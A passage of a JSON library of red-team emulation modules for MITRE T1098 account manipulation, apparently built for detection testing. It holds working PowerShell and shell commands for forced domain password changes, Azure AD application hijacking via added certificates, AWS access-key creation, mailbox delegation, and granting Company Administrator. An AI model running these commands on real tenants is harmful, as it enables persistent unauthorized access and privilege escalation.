      "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this RAGLOX module to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the raglox manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_password",
          "description": "The password to set for the current domain user (default is long and has upper and lower case and number but no special character)",
          "type": "string",
          "default_value": "UpperLowerLong333noSpecialChar"
        },
        {
          "name": "cred_file",
          "description": "A file containing the password of the current user",
          "type": "path",
          "default_value": "$env:LOCALAPPDATA\\RAGLOXRedTeam\\$env:USERNAME.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Password for current user must be stored in a credential file\n",
          "check_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
        }
      ],
      "rx_module_id": "7d984ef2-2db2-4cec-b090-e637e1698f61",
      "module_name": "Domain Password Policy Check: No Special Character in Password"
    },
    {
      "index": 623,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this RAGLOX module to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the raglox manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_password",
          "description": "The password to set for the current domain user (default is long and has and lower case and special character and number but no uppercase)",
          "type": "string",
          "default_value": "lower-long-special-333"
        },
        {
          "name": "cred_file",
          "description": "A file containing the password of the current user",
          "type": "path",
          "default_value": "$env:LOCALAPPDATA\\RAGLOXRedTeam\\$env:USERNAME.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Password for current user must be stored in a credential file\n",
          "check_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
        }
      ],
      "rx_module_id": "b299c120-44a7-4d68-b8e2-8ba5a28511ec",
      "module_name": "Domain Password Policy Check: No Uppercase Character in Password"
    },
    {
      "index": 624,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this RAGLOX module to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the raglox manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_password",
          "description": "The password to set for the current domain user (default is long and has and upper case and special character and number but no lowercase)",
          "type": "string",
          "default_value": "UPPER-LONG-SPECIAL-333"
        },
        {
          "name": "cred_file",
          "description": "A file containing the password of the current user",
          "type": "path",
          "default_value": "$env:LOCALAPPDATA\\RAGLOXRedTeam\\$env:USERNAME.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Password for current user must be stored in a credential file\n",
          "check_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
        }
      ],
      "rx_module_id": "945da11e-977e-4dab-85d2-f394d03c5887",
      "module_name": "Domain Password Policy Check: No Lowercase Character in Password"
    },
    {
      "index": 625,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this RAGLOX module to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the raglox manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_password",
          "description": "The password to set for the current domain user (default has only upper and lower case characters)",
          "type": "string",
          "default_value": "onlyUPandLowChars"
        },
        {
          "name": "cred_file",
          "description": "A file containing the password of the current user",
          "type": "path",
          "default_value": "$env:LOCALAPPDATA\\RAGLOXRedTeam\\$env:USERNAME.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Password for current user must be stored in a credential file\n",
          "check_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
        }
      ],
      "rx_module_id": "784d1349-5a26-4d20-af5e-d6af53bae460",
      "module_name": "Domain Password Policy Check: Only Two Character Classes"
    },
    {
      "index": 626,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this RAGLOX module to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the raglox manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_password",
          "description": "The password to set for the current domain user (default is Season and current year combo)",
          "type": "string",
          "default_value": "Spring$((Get-Date).Year)!"
        },
        {
          "name": "cred_file",
          "description": "A file containing the password of the current user",
          "type": "path",
          "default_value": "$env:LOCALAPPDATA\\RAGLOXRedTeam\\$env:USERNAME.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Password for current user must be stored in a credential file\n",
          "check_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
        }
      ],
      "rx_module_id": "81959d03-c51f-49a1-bb24-23f1ec885578",
      "module_name": "Domain Password Policy Check: Common Password Use"
    },
    {
      "index": 627,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "This RAGLOX will: \n  - Create a service account\n  - Create a service account key, \n  - Store the result of retrieving a single key for that service account as a variable\n  - Pass that variable for deletion\n  - Delete the service account\n\nThe idea for this RAGLOX came from a Rule published by the Elastic team.\n\nIdentifies the deletion of an Identity and Access Management (IAM) service account key in Google Cloud Platform (GCP).\nEach service account is associated with two sets of public/private RSA key pairs that are used to authenticate. \nIf a key is deleted, the application will no longer be able to access Google Cloud resources using that key. A security best practice is to rotate your service account keys regularly.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n",
      "execution": {
        "platforms": [
          "iaas:gcp"
        ],
        "executor_type": "sh",
        "command": "gcloud config set project #{project_id}\nKEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`\ngcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet\n",
        "elevation_required": false,
        "cleanup_command": "cd \"$PathToRagloxModulesFolder/T1098/src/T1098-17/\"\nterraform state rm google_service_account_key.key\nterraform destroy -auto-approve\n"
      },
      "variables": [
        {
          "name": "project_id",
          "description": "ID of the GCP Project you to execute the command against.",
          "type": "string",
          "default_value": "raglox-test-1"
        },
        {
          "name": "service_name",
          "description": "The name of the service account.",
          "type": "string",
          "default_value": "raglox-service-account"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires gcloud\n",
          "check_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Please Install Google Cloud SDK before running this RAGLOX module : https://cloud.google.com/sdk/docs/install\"\n"
        },
        {
          "description": "Check if user is logged in \n",
          "check_command": "gcloud config get-value account\n",
          "install_command": "gcloud auth login --no-launch-browser\n"
        },
        {
          "description": "Check if terraform is installed.\n",
          "check_command": "terraform version\n",
          "install_command": "echo Please install the terraform.\n"
        },
        {
          "description": "Create dependency resources using terraform\n",
          "check_command": "stat \"$PathToRagloxModulesFolder/T1098/src/T1098-17/terraform.tfstate\"\n",
          "install_command": "cd \"$PathToRagloxModulesFolder/T1098/src/T1098-17/\"\nterraform init\nterraform apply -auto-approve\n"
        }
      ],
      "rx_module_id": "7ece1dea-49f1-4d62-bdcc-5801e3292510",
      "module_name": "GCP - Delete Service Account Key"
    },
    {
      "index": 628,
      "technique_id": "T1098.001",
      "technique_name": "Account Manipulation: Additional Cloud Credentials",
      "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"raglox.example.com\" -FriendlyName \"RAGLOXCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"RAGLOXTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"RAGLOXTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"RAGLOXCert\" } | Remove-Item\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "service_principal_name",
          "description": "Name of the targeted service principal",
          "type": "string",
          "default_value": "SuperSP"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        }
      ],
      "rx_module_id": "b8e747c3-bdf7-4d71-bce2-f1df2a057406",
      "module_name": "Azure AD Application Hijacking - Service Principal"
    },
    {
      "index": 629,
      "technique_id": "T1098.001",
      "technique_name": "Account Manipulation: Additional Cloud Credentials",
      "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"raglox.example.com\" -FriendlyName \"RAGLOXCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"RAGLOXTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"RAGLOXTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"RAGLOXCert\" } | Remove-Item\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "application_name",
          "description": "Name of the targeted application",
          "type": "string",
          "default_value": "SuperApp"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        }
      ],
      "rx_module_id": "a12b5531-acab-4618-a470-0dafb294a87a",
      "module_name": "Azure AD Application Hijacking - App Registration"
    },
    {
      "index": 630,
      "technique_id": "T1098.001",
      "technique_name": "Account Manipulation: Additional Cloud Credentials",
      "description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws iam create-access-key --user-name #{username} > \"$PathToRagloxModulesFolder/T1098.001/bin/aws_secret.creds\"\ncd \"$PathToRagloxModulesFolder/T1098.001/bin/\"\n./aws_secret.sh\n",
        "elevation_required": false,
        "cleanup_command": "access_key=`cat \"$PathToRagloxModulesFolder/T1098.001/bin/aws_secret.creds\" | jq -r '.AccessKey.AccessKeyId'`\naws iam delete-access-key --access-key-id $access_key --user-name #{username}\nrm \"$PathToRagloxModulesFolder/T1098.001/bin/aws_secret.creds\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Create new AWS access and secret keys for the user",
          "type": "string",
          "default_value": "raglox"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if the user exists.\n",
          "check_command": "aws iam list-users | grep #{username}\n",
          "install_command": "echo Please run RAGLOX module T1136.003, before running this raglox\n"
        }
      ],
      "rx_module_id": "8822c3b0-d9f9-4daf-a043-491160a31122",
      "module_name": "AWS - Create Access Key and Secret Key"
    },
    {
      "index": 631,
      "technique_id": "T1098.002",
      "technique_name": "Account Manipulation: Additional Email Delegate Permissions",
      "description": "Give a nominated user, full mailbox delegation access of another user.\nThis can be used by an adversary to maintain persistent access to a target's mailbox in M365.\n",
      "execution": {
        "platforms": [
          "office-365"
        ],
        "executor_type": "powershell",
        "command": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nAdd-MailboxPermission -Identity \"#{delegate_target}\" -User \"#{operator_mailbox}\" -AccessRights FullAccess -InheritanceType All\nDisconnect-ExchangeOnline -Confirm:$false\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nRemove-MailboxPermission -Identity \"#{delegate_target}\" -User \"#{operator_mailbox}\" -AccessRights FullAccess -InheritanceType All -Confirm:$false\nDisconnect-ExchangeOnline -Confirm:$false\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "office-365 username",
          "type": "string",
          "default_value": "o365_user_test@contoso.com"
        },
        {
          "name": "password",
          "description": "office-365 password",
          "type": "string",
          "default_value": "o365_password_test"
        },
        {
          "name": "delegate_target",
          "description": "office-365 target_email",
          "type": "string",
          "default_value": "delegate@contoso.com"
        },
        {
          "name": "operator_mailbox",
          "description": "office-365 target_email",
          "type": "string",
          "default_value": "operator@contoso.com"
        }
      ],
      "prerequisites": [
        {
          "description": "ExchangeOnlineManagement PowerShell module must be installed\n",
          "check_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module -Name ExchangeOnlineManagement         \n"
        }
      ],
      "rx_module_id": "17d046be-fdd0-4cbb-b5c7-55c85d9d0714",
      "module_name": "EXO - Full access mailbox permission granted to a user"
    },
    {
      "index": 632,
      "technique_id": "T1098.003",
      "technique_name": "Account Manipulation: Additional Cloud Roles",
      "description": "Add an existing Azure user account the Company Administrator Role.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module MSOnline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "target_user",
          "description": "Name of the user who will be assigned the Company Admin role",
          "type": "string",
          "default_value": "default"
        }
      ],
      "prerequisites": [
        {
          "description": "MSOnline module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name MSOnline -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name MSOnline -Force\n"
        }
      ],
      "rx_module_id": "4d77f913-56f5-4a14-b4b1-bf7bb24298ad",
      "module_name": "Azure AD - Add Company Administrator Role to a user"
    },
    {
      "index": 633,
      "technique_id": "T1098.003",
      "technique_name": "Account Manipulation: Additional Cloud Roles",
      "description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
